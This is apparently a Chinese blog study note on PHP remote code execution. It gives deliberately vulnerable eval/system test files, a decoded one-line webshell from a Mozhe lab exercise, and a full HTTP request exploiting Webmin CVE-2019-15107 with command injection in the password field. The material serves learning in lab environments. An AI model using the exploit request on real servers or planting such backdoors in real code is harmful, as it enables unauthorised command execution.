---
title: "RCE代码执行基础部分"
date: 2026-04-07
published: 2026-04-07
author: Rin
permalink: /posts/网安笔记/web漏洞/RCE/RCE代码执行基础部分/
categories:
  - 网安笔记
  - web漏洞
  - RCE
  - RCE代码执行基础部分
tags:
  - Study
---

在 Web 应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用 代码或命令执行函数去处理。比如当应用在调用一些能将字符串转化成代 码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏 洞。同样调用系统命令处理，将造成命令执行漏洞。

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628823541359-475e91f5-4f42-44a6-b59c-7b35fcb644ac.png)

### PHP

eval()函数中的eval是evaluate的简称，这个函数的作用就是把一段字符串当作PHP语句来执行，一般情况下不建议使用容易被黑客利用。

在服务器上创建以下代码

```
root@ae63a3df5e26:/var/www/html# cat test.php
<?php
        $code=$_GET['x'];
        eval($code);
?>
```

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628824442967-65f607b2-40c0-4621-b156-b6df0f6ab798.png)

```
root@ae63a3df5e26:/var/www/html# cat test.php
<?php
        $code=$_GET['x'];
        echo system($code);
?>
```

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628824815660-a3cfd866-0db4-43eb-a0ab-4d4b979ee921.png)

  

形成漏洞的原因：可控变量，函数漏洞

  

  

### pikachu RCE

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628842930735-7e7ab4dd-d484-4767-a3db-28a070b3cb22.png)![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628842954811-c9e36bcf-4669-4ebd-99d9-c59243f6206e.png)

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628842990821-e95e3d3f-27b2-4a20-a1c7-052d5fb960d5.png)![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628843001051-0d2e5c24-91fc-450c-b43a-e33990cee6cb.png)

### mozhe

PHP代码分析溯源(第4题)

```
<?php 
	echo(gzinflate(base64_decode("&40pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==&"))); 
?>
```

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628847428641-224e6945-e22b-47cb-9367-fcb70c3a3628.png)

靶场源代码

```
<?php 
	eval(gzinflate(base64_decode("&40pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==&"))); 
?>
```

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628847530832-0de66a5f-0f54-4987-8b87-7d6fbb862f37.png)

**说明：**本来这是一个代码执行的漏洞但是由于代码含有` echo `` `调用了系统命令而前面的echo正好将后面的 ` echo `` `打印出来，所以也就成一个代码执行漏洞变成了一个系统执行漏洞。

解码之后的代码也就是这样

```
<?php 
	eval(echo `$_REQUEST[a]`); 
?>
```

### webadmin

[https://vulhub.org/#/environments/webmin/CVE-2019-15107/](https://vulhub.org/#/environments/webmin/CVE-2019-15107/)

```
cd /opt/vulhub/vulhub-master/webmin/CVE-2019-15107
docker-compose up -d
```

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628856980041-d0e6379f-a82e-462b-b1f1-9a62300c9705.png)

root/webmin

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628857018192-b73a50c1-5a94-4b91-bd03-2bb311cdb622.png)

```
POST /password_change.cgi HTTP/1.1
Host: 10.1.1.7:10000
Cookie: redirect=1; testing=1; sessiontest=1; sid=x
Content-Length: 60
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"
Sec-Ch-Ua-Mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: https://10.1.1.7:10000
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://10.1.1.7:10000/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2
```

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628935012373-ccd13095-1792-4afd-b838-4d421f100d93.png)

### php敏感函数

[https://wrpzkb.cn/rce/](https://wrpzkb.cn/rce/)

```
1、eval()

```

---

### 演示案例：

- 墨者靶场黑盒功能点命令执行-应用功能
- 墨者靶场白盒代码及命令执行-代码分析
- 墨者靶场黑盒层 RCE 漏洞检测-公开漏洞
- Javaweb-Struts2 框架类 RCE 漏洞-漏洞层面
- 一句话 Webshell 后门原理代码执行-拓展说明

  

  

  

### 涉及资源

```
https://www.cnblogs.com/ermei/p/6689005.html

http://blog.leanote.com/post/snowming/9da184ef24bd

https://www.mozhe.cn/bug/detail/T0YyUmZRa1paTkJNQ0JmVWt3Sm13dz09bW96aGUmozhe

https://www.mozhe.cn/bug/detail/RWpnQUllbmNaQUVndTFDWGxaL0JjUT09bW96aGUmozhe

https://www.mozhe.cn/bug/detail/d01lL2RSbGEwZUNTeThVZ0xDdXl0Zz09bW96aGUmozhe
```
